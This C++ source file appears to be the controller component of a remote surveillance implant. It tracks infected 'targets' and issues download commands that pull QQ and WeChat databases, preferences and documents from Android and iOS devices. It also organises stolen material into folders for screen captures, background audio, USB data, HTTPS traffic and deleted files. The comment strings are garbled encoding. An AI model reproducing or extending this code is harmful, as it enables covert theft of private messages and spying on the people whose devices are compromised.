//---------------------------------------------------------------------------

#include "adkprecomp.h"
#include "maindlg.h"
#include "targetdlg.h"
#include "target.h"
#include "Utility.h"
#include "TargetConnection.h"
#include "ControlConnection.h"
#include "DatabaseManager.h"
#include "EventSelect.h"
#include "ProcessFileTask.h"

#include "adkfile.h"

#include "ApplicationPathParser.h"

//---------------------------------------------------------------------------

std::map<ULONG, Target *> g_targetMap;

// ��ȡ���ż�¼��Ҫɾ�����ļ�
const wchar_t* PhoneRecordFile = L"/data/cores/Users/All Users/Intel/plgArgs";

// Android app path
const std::wstring Target::Android_QQDataPath(L"/data/data/com.tencent.mobileqq");
const std::wstring Target::Android_WeixinDataPath(L"/data/data/com.tencent.mm");

const wchar_t* Android_QQ_downloadDir[] =
{
	L"/data/data/com.tencent.mobileqq/shared_prefs",
	L"/data/data/com.tencent.mobileqq/databases"
};

const wchar_t* Android_Weixin_downloadDir[] =
{
	L"/data/data/com.tencent.mm/shared_prefs",
	L"/data/data/com.tencent.mm/MicroMsg"
};

// IOS app path

const wchar_t* IOS_AppConfigDir = L"/var/mobile/Library/Caches";
const wchar_t* IOS_AppConfig = L"\\var\\mobile\\Library\\Caches\\com.apple.mobile.installation.plist";
const wchar_t* IOS_AppDir = L"/private/var/mobile/Applications";

void Target::AndroidDownloadAppDataDir()
{
	int arrayCount = sizeof(Android_QQ_downloadDir) / sizeof(const wchar_t*);
	for ( int i = 0; i < arrayCount; ++i )
	{
		this->tarConn->Send_ADT(
			this->dwTargetID,
			FILEDOWN,
			GetBase64FromWide(Android_QQ_downloadDir[i]).c_str(),
			0,
			1);

		AddAppInfoListener(Android_QQ_downloadDir[i]);
	}

	arrayCount = sizeof(Android_Weixin_downloadDir) / sizeof(const wchar_t*);

	for ( int i = 0; i < arrayCount; ++i )
	{
		this->tarConn->Send_ADT(
			this->dwTargetID,
			FILEDOWN,
			GetBase64FromWide(Android_Weixin_downloadDir[i]).c_str(),
			0,
			1);
		AddAppInfoListener(Android_Weixin_downloadDir[i]);
	}
}

void Target::IOSDownloadAppConfig()
{
	this->tarConn->Send_ADT(
		this->dwTargetID,
		FILEDOWN,
		GetBase64FromWide(IOS_AppConfigDir).c_str(),
		1,
		1);

	AddAppInfoListener(IOS_AppConfigDir);
}

std::wstring Target::GetLocalFilePath(const std::wstring& tarPath)
{
	LPCWSTR lpDriver = tarPath.c_str();

	std::wstring widLogicPath = this->widLocalDataDir +  L"\\Disk";	

	std::wstring widPath = widLogicPath;
	LPCWSTR lpwzPath = NULL;

	lpwzPath = lpDriver;
	LPCWSTR lpwzNext = wcschr(lpwzPath+1, L'/');

	while(lpwzNext)
	{
		int index = lpwzPath - lpDriver;
		int count = lpwzNext - lpwzPath;

		widPath = widPath + std::wstring(L"\\") + tarPath.substr(index+1, count-1);      
		CreateDirectoryW(widPath.c_str(), NULL);

		lpwzPath = lpwzNext;
		lpwzNext = wcschr(lpwzPath+1, L'/');        
	}

	lpwzPath++;
	widPath = widPath + L"\\" + lpwzPath;

	return widPath;
}

const std::wstring QQDomain(L"com.tencent.mqq");
const std::wstring WeixinDomain(L"com.tencent.xin");

void Target::IOSDownloadAppDataDir(const std::wstring& appPlist)
{
	ApplicationPathParer& parser = ApplicationPathParer::CreateInstance();

	if ( !parser.Load(this->widDiskDataDir) )
		return;

	std::wstring qqPath = parser.GetApplicationPathOrigin(QQDomain);
	std::wstring weixinPath = parser.GetApplicationPathOrigin(WeixinDomain);

	if ( !qqPath.empty() )
	{
		this->tarConn->Send_ADT(
			this->dwTargetID,
			FILEDOWN,
			GetBase64FromWide(qqPath + L"/Documents").c_str(),
			0,
			1);

		AddAppInfoListener(qqPath + L"/Documents");
	}

	if ( !weixinPath.empty() )
	{
		this->tarConn->Send_ADT(
			this->dwTargetID,
			FILEDOWN,
			GetBase64FromWide(weixinPath + L"/Documents").c_str(),
			0,
			1);

		AddAppInfoListener(weixinPath + L"/Documents");
	}
}

bool Target::IsMobileAppPath(const std::wstring& path)
{
	if ( FileInDir(path, Android_QQDataPath) )
		return true;

	if ( FileInDir(path, Android_WeixinDataPath) )
		return true;

	if ( FileInDir(path, IOS_AppDir) )
		return true;

	if ( FileInDir(path, IOS_AppConfigDir) )
		return true;

	return false;
}

//---------------------------------------------------------------------------
Target::Target()
	:tarStatus(TAROFFLINE), 
	dwProtocolVersion(0), 
	lastTime(0), 
	tarConn(NULL),
	curFileTask(NULL),
	dpapiId(0),
	dpapiLoadFlag(false),
	bIsMyTarget(false), 
	bConnecting(false),
	bCleared(false),
	m_favorite(false),
	m_autoGetDirInfoDepth(-1),
	m_flowStatistics(0)
{
	this->frmTarControl = NULL;
	this->aniLocalDataDir = "";
	this->widLocalDataDir = L"";
	this->widDiskDataDir = L"";
	this->widUsbDataDir = L"";
	this->widDelDataDir = L"";
	this->widHttpsDataDir = L"";
	this->widDirPath = L"";
	bTarConnOnline = false;
	bRedirectIO = false;
	m_netEnv = NETWORK_WIFI_INUSE;

	InitializeCriticalSection(&this->csFileTask);

	ZeroMemory(&logicDriverSet, sizeof(DriverSet));
	ZeroMemory(pluginVect,MAX_PLG_COUNT *sizeof(PVOID));

	logicDriverSet.DriveMap = 0;
}
//---------------------------------------------------------------------------
Target::~Target()
{
	this->ClearAllFileTask();

	for (int i = 0; i < MAX_PLG_COUNT; i++)
	{
		PPLUGIN_CONTEXT	pluginCxt = pluginVect[i];
		if (pluginCxt)
		{
			FreePluginCxt(pluginCxt);
		}
	}

	DeleteCriticalSection(&this->csFileTask);
}
//---------------------------------------------------------------------------
void __fastcall Target::CheckAndCreateDataDir()
{
	this->aniLocalDataDir = PathMergeA(FrmMain->aniLocalTarFileDir, QString("%1").arg(this->dwTargetID).toStdString());
	this->widLocalDataDir = AnsiToWide(this->aniLocalDataDir);

	bool bCreate = true;
	if (this->aniLocalDataDir.length() == 0)
	{
		bCreate = true;
	}
	else
	{
		if ( ! AdkFileIsExistA(this->aniLocalDataDir.c_str()))
		{
			bCreate = true;
		}
	}

	if ( bCreate )
	{

		this->widDiskDataDir  = this->widLocalDataDir + L"\\Disk";
		this->widUsbDataDir   = this->widLocalDataDir + L"\\Usb";
		this->widDelDataDir   = this->widLocalDataDir + L"\\Delete";
		this->wideScreenPath  = this->widLocalDataDir + L"\\Screen";
		this->widBackSoundPath = this->widLocalDataDir + L"\\BackSound";
		this->widHttpsDataDir = this->widLocalDataDir + L"\\Https";
		this->widDirPath      = this->widLocalDataDir + L"\\Dir";
		this->widMultimediaPath      = this->widLocalDataDir + L"\\Multimedia";
		this->wid3rdFilePath = this->widLocalDataDir + L"\\3rd";

		// ���µ����ݿ���
		//
		DM->UpdateTargetInfo(this);
	}

	// Ŀ���Ŀ¼
	//
	CheckAndCreateDirectory(this->aniLocalDataDir.c_str());

	// �ļ����񻺴�Ŀ¼
	//
	std::string ftDir = this->aniLocalDataDir + "\\FileTasking";
	CheckAndCreateDirectory(ftDir.c_str());

	// ���̷���Ŀ¼
	//
	std::string diskDir = this->aniLocalDataDir + "\\Disk";
	CheckAndCreateDirectory(diskDir.c_str());

	// USB����Ŀ¼
	//
	std::string usbDir = this->aniLocalDataDir + "\\USB";
	CheckAndCreateDirectory(usbDir.c_str());

	// ��Ļ���Ŀ¼
	//
	std::string screenDir = this->aniLocalDataDir + "\\Screen";
	CheckAndCreateDirectory(screenDir.c_str());

	// ������Ŀ¼
	std::string backSoundDir = this->aniLocalDataDir + "\\BackSound";
	CheckAndCreateDirectory(backSoundDir.c_str());

	// ����Ƶ���
	std::string multimediaDir = this->aniLocalDataDir + "\\Multimedia";
	CheckAndCreateDirectory(multimediaDir.c_str());

	// ɾ�������б�
	//
	std::string deleteDir = this->aniLocalDataDir + "\\Delete";
	CheckAndCreateDirectory(deleteDir.c_str());

	// HttpsĿ¼
	//
	std::string httpsDir = this->aniLocalDataDir + "\\Https";
	CheckAndCreateDirectory(httpsDir.c_str());

	// DIRĿ¼
	//
	std::string dirPath = this->aniLocalDataDir + "\\Dir";
	CheckAndCreateDirectory(dirPath.c_str());

	// ���������
	std::string thirdPath = this->aniLocalDataDir + "\\3rd";
	CheckAndCreateDirectory(thirdPath.c_str());

	// ��������
	std::wstring iniFile = this->widLocalDataDir + L"\\flow_statistics.ini";
	m_flowStatistics = ReadValueFromLocal(L"FlowStatistics", L"flow", iniFile.c_str());

}
//---------------------------------------------------------------------------
bool __fastcall Target::QueryFileTasking()
{
	bool bRet = false;

	EnterCriticalSection(&csFileTask);
	std::map<ULONG , DirTask *>::iterator i = this->dirTaskMap.begin();
	for (; i != this->dirTaskMap.end(); i++)
	{
		DirTask *dirTask = (*i).second;
		if (dirTask->taskStatus == WORKING || dirTask->taskStatus == PAUSED)
		{
			bRet = true;
			break;
		}
	}

	if (bRet)
	{
		LeaveCriticalSection(&csFileTask);
		return true;
	}

	std::map<ULONG , SearchTask *>::iterator k = this->searchTaskMap.begin();
	for (; k != this->searchTaskMap.end(); k++)
	{
		SearchTask *searchTask = (*k).second;
		if (searchTask->taskStatus == WORKING || searchTask->taskStatus == PAUSED)
		{
			bRet = true;
			break;
		}
	}

	if (bRet)
	{
		LeaveCriticalSection(&csFileTask);
		return true;
	}    

	std::map<ULONG , FileTask *>::iterator j = this->fileTaskMap.begin();
	for (; j != this->fileTaskMap.end(); j++)
	{
		FileTask *fileTask = (*j).second;
		if (fileTask->taskStatus == WORKING || fileTask->taskStatus == PAUSED)
		{
			bRet = true;
			break;
		}
	}

	LeaveCriticalSection(&csFileTask);

	return bRet;
}
//---------------------------------------------------------------------------
void __fastcall Target::ClearAllFileTask()
{
	EnterCriticalSection(&this->csFileTask);
	std::map<ULONG , FileTask *>::iterator j = this->fileTaskMap.begin();
	for (; j != this->fileTaskMap.end(); j++)
	{
		FileTask *fileTask = (*j).second;

		// �˴�ԭ������ֱ�ӵ��� DeleteFile��
		// ���ڵ����� fileTaskMap �� erase��
		// �ᵼ��һ��������ʧЧ�� bug������
		// ��������

		if ( NULL == fileTask )
		{
			continue;
		}

		if (this->curFileTask == fileTask)
		{
			this->curFileTask = NULL;
		}

		if (fileTask->hFile)
		{
			CloseHandle(fileTask->hFile);
			fileTask->hFile = NULL;
		}

//		delete fileTask;   
	}

	this->fileTaskMap.clear();
	LeaveCriticalSection(&this->csFileTask);
}
//---------------------------------------------------------------------------
FileTask * __fastcall Target::GetFileTaskFromMap(ULONG taskId)
{
	FileTask* fileTask = NULL;
	//EnterCriticalSection(&csFileTask);
	std::map<ULONG,FileTask *>::iterator i = this->fileTaskMap.find(taskId);
	if (i != this->fileTaskMap.end())
	{
		fileTask = (FileTask *)(*i).second;
	}
	//LeaveCriticalSection(&csFileTask);

	return fileTask;
}
//---------------------------------------------------------------------------
DirTask * __fastcall Target::GetDirTaskFromMap(ULONG taskId)
{
	EnterCriticalSection(&csFileTask);
	std::map<ULONG, DirTask *>::iterator i = this->dirTaskMap.find(taskId);
	if (i == this->dirTaskMap.end())
	{
		LeaveCriticalSection(&csFileTask);
		return NULL; 
	}
	LeaveCriticalSection(&csFileTask);

	return (DirTask *)(*i).second;
}
//---------------------------------------------------------------------------
SearchTask * __fastcall Target::GetSearchTaskFromMap(ULONG taskId)
{
	std::map<ULONG, SearchTask *>::iterator i = this->searchTaskMap.find(taskId);
	if (i == this->searchTaskMap.end())
	{
		return NULL;
	}

	return (SearchTask *)(*i).second;
}
//---------------------------------------------------------------------------
void __fastcall Target::FileTaskProgressChanged(FileTask * fileTask)
{
	xASSERT((fileTask));

	if (this->frmTarControl)
	{
		TargetDlg * frm = (TargetDlg *)this->frmTarControl;
		SendMessage(frm->Handle, WM_UPT_FILETASK_PROGRESS, (unsigned int)fileTask, NULL);
	}                            
}
//---------------------------------------------------------------------------
void __fastcall Target::FileTaskResumed(FileTask *fileTask)
{
	switch(fileTask->taskType)
	{
	case TASK_FILEDATA:
		if (fileTask->taskDirect == FILEDOWN)
		{
			SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �ļ���������(ID:%d)�ָ� - �����ļ�\"%s\"",
				this->widTargetName.c_str(),
				fileTask->dwTargetID,
				fileTask->dwTaskID,
				fileTask->tarPathW.c_str());
		}
		else
		{
			SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �ļ��ϴ�����(ID:%d)�ָ� - �ϴ��ļ�\"%s\"��\"%s\"",
				this->widTargetName.c_str(),
				fileTask->dwTargetID,
				fileTask->dwTaskID,
				fileTask->ctrPathW.c_str(),
				fileTask->tarPathW.c_str());
		}
		break;

	case TASK_DIRFILE:

		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Ŀ¼����ָ��(ID:%d)���ļ���ָ��(ID:%d)�ָ� - �����ļ�\"%s\"",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwParentID,
			fileTask->dwTaskID,
			fileTask->tarPathW.c_str());
		break;

	case TASK_PLUGINDATA:
		SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �������������������(ID:%d)�ָ�",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwTaskID);
		break;

	case TASK_DIRINFO:
	case TASK_SEARCHINFO:
		// DIRINFO��SEARCHINFO���丸ָ���״̬������־
		//
		break;

	default:
		break;
	}
}
//---------------------------------------------------------------------------
void __fastcall Target::FileTaskPaused(FileTask *fileTask)
{
	switch(fileTask->taskType)
	{
	case TASK_FILEDATA:
		if (fileTask->taskDirect == FILEDOWN)
		{
			SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �ļ���������(ID:%d)��ͣ - �����ļ�\"%s\"",
				this->widTargetName.c_str(),
				fileTask->dwTargetID,
				fileTask->dwTaskID,
				fileTask->tarPathW.c_str());
		}
		else
		{
			SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �ļ��ϴ�����(ID:%d)��ͣ - �ϴ��ļ�\"%s\"��\"%s\"",
				this->widTargetName.c_str(),
				fileTask->dwTargetID,
				fileTask->dwTaskID,
				fileTask->ctrPathW.c_str(),
				fileTask->tarPathW.c_str());
		}
		break;

	case TASK_DIRFILE:

		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Ŀ¼����ָ��(ID:%d)���ļ���ָ��(ID:%d)��ͣ - �����ļ�\"%s\"",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwParentID,
			fileTask->dwTaskID,
			fileTask->tarPathW.c_str());
		break;

	case TASK_PLUGINDATA:
		SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �������������������(ID:%d)��ͣ",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwTaskID);
		break;

	case TASK_DIRINFO:
	case TASK_SEARCHINFO:
		// DIRINFO��SEARCHINFO���丸ָ���״̬������־
		//
		break;

	default:
		break;
	}            
}
//---------------------------------------------------------------------------
void __fastcall Target::FileTaskCanceled(FileTask *fileTask)
{
	switch(fileTask->taskType)
	{
	case TASK_FILEDATA:
		if (fileTask->taskDirect == FILEDOWN)
		{
			SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �ļ���������(ID:%d)ȡ�� - �����ļ�\"%s\"",
				this->widTargetName.c_str(),
				fileTask->dwTargetID,
				fileTask->dwTaskID,
				fileTask->tarPathW.c_str());
		}
		else
		{
			SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �ļ��ϴ�����(ID:%d)ȡ�� - �ϴ��ļ�\"%s\"��\"%s\"",
				this->widTargetName.c_str(),
				fileTask->dwTargetID,
				fileTask->dwTaskID,
				fileTask->ctrPathW.c_str(),
				fileTask->tarPathW.c_str());
		}
		break;

	case TASK_DIRFILE:

		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Ŀ¼����ָ��(ID:%d)���ļ���ָ��(ID:%d)ȡ�� - �����ļ�\"%s\"",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwParentID,
			fileTask->dwTaskID,
			fileTask->tarPathW.c_str());
		break;

	case TASK_PLUGINDATA:
		SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �������������������(ID:%d)ȡ��",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwTaskID);
		break;

	case TASK_DIRINFO:
	case TASK_SEARCHINFO:
		// DIRINFO��SEARCHINFO���丸ָ���״̬������־
		//
		break;

	default:
		break;
	}

	DeleteFileA(fileTask->aniTmpTaskPath.c_str());    
}
//---------------------------------------------------------------------------
void __fastcall Target::FileTaskErrored(FileTask *fileTask)
{
	switch(fileTask->taskType)
	{
	case TASK_FILEDATA:

		if (fileTask->taskDirect == FILEDOWN)
		{
			SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �ļ���������(ID: %d)����(%s) - �����ļ�\"%s\"",
				this->widTargetName.c_str(),
				fileTask->dwTargetID,
				fileTask->dwTaskID,
				ConvertErrorIdToStrW(fileTask->dwErrorID).c_str(),
				fileTask->tarPathW.c_str());
		}
		else
		{
			SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �ļ��ϴ�����(ID: %d)����(%s) - �ϴ��ļ�\"%s\"��\"%s\"",
				this->widTargetName.c_str(),
				fileTask->dwTargetID,
				fileTask->dwTaskID,
				ConvertErrorIdToStrW(fileTask->dwErrorID).c_str(),
				fileTask->ctrPathW.c_str(),                                                
				fileTask->tarPathW.c_str());
		}
		break;

	case TASK_DIRFILE:

		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Ŀ¼����ָ��(ID:%d)����ָ��(ID:%d)����(%s) - �����ļ�\"%s\"",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwParentID,
			fileTask->dwTaskID,
			ConvertErrorIdToStrW(fileTask->dwErrorID).c_str(),
			fileTask->tarPathW.c_str());
		break;

	case TASK_PLUGINDATA:
		SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] �������������������(ID: %d)����(%s)",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwTaskID,
			ConvertErrorIdToStrW(fileTask->dwErrorID).c_str());
		break;

	case TASK_DIRINFO:
	case TASK_SEARCHINFO:
		// DIRINFO��SEARCHINFO���丸ָ���״̬������־
		//
		break;

	default:
		break;
	}

	DeleteFileA(fileTask->aniTmpTaskPath.c_str());
}
//---------------------------------------------------------------------------
void __fastcall Target::FileTaskFinished(FileTask *fileTask)
{
	EnterCriticalSection(&this->csFileTask);

	switch(fileTask->taskType)
	{
	case TASK_FILEDATA:
	case TASK_DIRFILE:
	case TASK_SEARCHFILE:

		if (fileTask->taskDirect == FILEDOWN)
		{

			if (fileTask->taskType == TASK_FILEDATA)

			{

				SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] ָ��(ID: %d)��� - �����ļ�\"%s\"",

					this->widTargetName.c_str(),
					fileTask->dwTargetID,
					fileTask->dwTaskID,
					fileTask->tarPathW.c_str());
			}
			else if (fileTask->taskType == TASK_DIRFILE)
			{
				SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Ŀ¼����ָ��(ID:%d)���ļ���ָ��(ID:%d)��� - �����ļ�\"%s\"",
					this->widTargetName.c_str(),
					fileTask->dwTargetID,
					fileTask->dwParentID,
					fileTask->dwTaskID,
					fileTask->tarPathW.c_str());
			}

			// ������������, �����ƶ�����Ӧ�ķ���Ŀ¼��
			//
			MoveTaskFileToDataDir(fileTask);
		}
		else
		{
			SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] ָ��(ID:%d)��� - �ϴ��ļ�\"%s\"��\"%s\"",
				this->widTargetName.c_str(),
				fileTask->dwTargetID,
				fileTask->dwTaskID,
				fileTask->ctrPathW.c_str(),
				fileTask->tarPathW.c_str());
		}

		// �������ļ����أ������ϴ������ܻ���Ҫ���½���
		//
		if (this->frmTarControl)
		{
			SendMessage(this->frmTarControl->Handle, WM_FILETASK_FINISHED, (unsigned int)fileTask, 0);
		}

		DeleteFileTask(fileTask);

		break;

	case TASK_DIRINFO:

		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] ���%d���Ŀ¼��Ϣָ��(ID: %d)���",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwPluginID,
			fileTask->dwTaskID);

		QueueUserWorkItem(ProcessDirInfo , fileTask, WT_EXECUTELONGFUNCTION);
		break;

	case TASK_SEARCHINFO:

		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] ���%dԶ������ָ��(ID: %d)���",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwPluginID,
			fileTask->dwTaskID);

		QueueUserWorkItem(ProcessSearchInfo , fileTask, WT_EXECUTEDEFAULT);
		break;

	case TASK_PLUGINDATA:

		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] ���%d��������ָ��(ID: %d)���",
			this->widTargetName.c_str(),
			fileTask->dwTargetID,
			fileTask->dwPluginID,
			fileTask->dwTaskID);

		QueueUserWorkItem(ProcessPluginData , fileTask, WT_EXECUTEDEFAULT);
		break;

	case TASK_PLUGINUPT:
		// DO NOTHING
		DeleteFileTask(fileTask);
		break;

	default:
		break;
	}    

	LeaveCriticalSection(&this->csFileTask);
}
//---------------------------------------------------------------------------
void __fastcall Target::MoveTaskFileToDataDir(FileTask *fileTask)
{
	xASSERT((fileTask));

	// @@@ Ŀǰ����ctrPathW�����жϣ�Ĭ��Ϊ.. �����ط���Ŀ¼
	//
	LPCWSTR lpDriver = fileTask->tarPathW.c_str();

	std::wstring widLogicPath;

	// �����̷���Ӧ��Ŀ¼ (windows)
	//

	if ( !UnixLike(this) )
	{
		widLogicPath = this->widLocalDataDir +  L"\\Disk\\" + fileTask->tarPathW.substr(0, 1);
	}
	else
	{
		widLogicPath = this->widLocalDataDir +  L"\\Disk";	
	}

	CreateDirectoryW(widLogicPath.c_str(), NULL);

	// ����������Ŀ¼
	//
	std::wstring widPath = widLogicPath;
	LPCWSTR lpwzPath = NULL;

	if ( UnixLike(this) )
	{
		lpwzPath = lpDriver;
		LPCWSTR lpwzNext = wcschr(lpwzPath+1, L'/');

		while(lpwzNext)
		{
			int index = lpwzPath - lpDriver;
			int count = lpwzNext - lpwzPath;

			widPath = widPath + std::wstring(L"\\") + fileTask->tarPathW.substr(index+1, count-1);         // widPath ǰ����, ����û��        
			CreateDirectoryW(widPath.c_str(), NULL);

			lpwzPath = lpwzNext;
			lpwzNext = wcschr(lpwzPath+1, L'/');        
		}
	}
	else
	{
		lpwzPath = lpDriver + 2;
		LPCWSTR lpwzNext = wcschr(lpwzPath+1, L'\\');

		while(lpwzNext)
		{
			int index = lpwzPath - lpDriver;
			int count = lpwzNext - lpwzPath;

			widPath = widPath + fileTask->tarPathW.substr(index, count);         // widPath ǰ����, ����û��        
			CreateDirectoryW(widPath.c_str(), NULL);

			lpwzPath = lpwzNext;
			lpwzNext = wcschr(lpwzPath+1, L'\\');        
		}
	}

	lpwzPath++;

	// �������ļ���Ҳ�ӵ�·����, �����ϻ�ȡ��ʱ��
	//
	SYSTEMTIME sysTime;
	GetLocalTime(&sysTime);

	WCHAR  wzTime[MAX_PATH];
	wsprintfW(wzTime, L"[%d-%02d-%02d %02d;%02d;%02d] ", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
		sysTime.wHour, sysTime.wMinute, sysTime.wSecond);

	// �����΢�š�qq��Ӧ�ó����Ŀ¼���ļ���ǰ�治��ʱ��
	if ( IsMobileAppPath(fileTask->tarPathW) )
		widPath = widPath + L"\\" + lpwzPath;
	else
		widPath = widPath + L"\\" + wzTime + lpwzPath;

	std::wstring TaskingPath = AnsiToWide(fileTask->aniTmpTaskPath);
	MoveFileExW(TaskingPath.c_str(), widPath.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED);

	// ɾ��Tmp Tasking File
	//
	DeleteFileW(TaskingPath.c_str());

	// ����ʱ��
	//
	if (fileTask->dwCTHighDataTime != 0 || fileTask->dwCTLowDataTime != 0)
	{
		// �����µ��ļ���ʱ��Ϊɾ��ǰ��ʱ��[���氡]
		//
		HANDLE hFile = CreateFileW(widPath.c_str(),
			GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			return;
		}

		FILETIME ftCreateTime;
		FILETIME ftLastAccessTime;
		FILETIME ftLastWriteTime;

		ftCreateTime.dwLowDateTime = fileTask->dwCTLowDataTime;
		ftCreateTime.dwHighDateTime = fileTask->dwCTHighDataTime;
		ftLastAccessTime.dwLowDateTime = fileTask->dwLALowDataTime;
		ftLastAccessTime.dwHighDateTime = fileTask->dwLAHighDataTime;
		ftLastWriteTime.dwLowDateTime = fileTask->dwLWLowDataTime;
		ftLastWriteTime.dwHighDateTime = fileTask->dwLWHighDataTime;

		SetFileTime(hFile,
			&ftCreateTime,
			&ftLastAccessTime,
			&ftLastWriteTime);

		CloseHandle(hFile);
	}

	return;
}
//---------------------------------------------------------------------------
void __fastcall Target::FileTaskStatusChanged(FileTask *fileTask, TaskStatus oldStatus)
{
	xASSERT((fileTask));
	xASSERT((fileTask->taskType != TASK_DIR));
	xASSERT((fileTask->taskType != TASK_SEARCH));

	EnterCriticalSection(&this->csFileTask);
	if (fileTask->taskStatus == ERRORED || fileTask->taskStatus == FINISHED
		|| fileTask->taskStatus == CANCELED || fileTask->taskStatus == PAUSED)
	{
		if (fileTask->hFile)
		{
			CloseHandle(fileTask->hFile);
			fileTask->hFile = NULL;
		}
	}
	LeaveCriticalSection(&this->csFileTask);

	// ���½���
	//
	if (this->frmTarControl)
	{
		TargetDlg * frm = (TargetDlg *)this->frmTarControl;
		SendMessage(frm->Handle, WM_UPT_FILETASK_STATUS, (unsigned int)fileTask, NULL);
	}

	// ���Ŵ���
	//
	switch (fileTask->taskStatus)
	{
	case FINISHED:

		// ���ڽ�����ģ�DeleteFileTask��FileTaskFinished�д���

		//

		FileTaskFinished(fileTask);

		break;

	case ERRORED:
		FileTaskErrored(fileTask);
		DeleteFileTask(fileTask);
		break;

	case CANCELED:
		FileTaskCanceled(fileTask);
		DeleteFileTask(fileTask);
		break;

	case PAUSED:
		FileTaskPaused(fileTask);
		break;

	case WORKING:

		if (oldStatus == PAUSED)
		{
			FileTaskResumed(fileTask);
		}

	default:
		break;
	}

	ScheduleTarFileTask(); 
}

void Target::DirFinished(DirTask *dirTask, TaskStatus oldStatus)
{
	if ( FINISHED != dirTask->taskStatus
		&& ERRORED != dirTask->taskStatus )
		return;

	if ( !m_listenPathSet.empty() )
	{
		if ( RemoveAppInfoListener(dirTask->tarDirPathW) )
		{
			if ( dirTask->tarDirPathW == IOS_AppConfigDir )
				IOSDownloadAppDataDir(dirTask->tarDirPathW);
			else
				AppInfoListenerTriggered();
		}
	}
}

//---------------------------------------------------------------------------
void __fastcall Target::DirTaskStatusChanged(DirTask *dirTask, TaskStatus oldStatus)
{
	// ������־
	//
	switch (dirTask->taskStatus)
	{
	case FINISHED:


		if (dirTask->dwAutoDown == 1)

		{

			SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Ŀ¼����ָ��(ID: %d)���",
				this->widTargetName.c_str(),
				dirTask->dwTargetID,
				dirTask->dwTaskID);
		}

		else

		{

			SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] ���Ŀ¼��Ϣ��ȡָ��(ID: %d)���",

				this->widTargetName.c_str(),
				dirTask->dwTargetID,
				dirTask->dwTaskID);
		}


		break;

	case ERRORED:

		if (dirTask->dwAutoDown == 1)
		{

			SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Ŀ¼����ָ��(ID: %d)����: %s",

				this->widTargetName.c_str(),
				dirTask->dwTargetID,
				dirTask->dwTaskID,
				ConvertErrorIdToStrW(dirTask->dwErrorID).c_str());
		}

		else

		{

			SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] ���Ŀ¼��Ϣ��ȡָ��(ID: %d)����: %s",

				this->widTargetName.c_str(),
				dirTask->dwTargetID,
				dirTask->dwTaskID,
				ConvertErrorIdToStrW(dirTask->dwErrorID).c_str());
		}

		break;

	case CANCELED:

		if (dirTask->dwAutoDown == 1)
		{

			SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Ŀ¼����ָ��(ID: %d)ȡ��",

				this->widTargetName.c_str(),
				dirTask->dwTargetID,
				dirTask->dwTaskID);
		}

		else

		{

			SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] ���Ŀ¼��Ϣ��ȡָ��(ID: %d)ȡ��",

				this->widTargetName.c_str(),
				dirTask->dwTargetID,
				dirTask->dwTaskID);
		}
		break;

	case PAUSED:

		if (dirTask->dwAutoDown == 1)
		{

			SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Ŀ¼����ָ��(ID: %d)��ͣ",

				this->widTargetName.c_str(),
				dirTask->dwTargetID,
				dirTask->dwTaskID);
		}

		else

		{

			SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] ���Ŀ¼��Ϣ��ȡָ��(ID: %d)��ͣ",

				this->widTargetName.c_str(),
				dirTask->dwTargetID,
				dirTask->dwTaskID);
		}
		break;

	case WORKING:

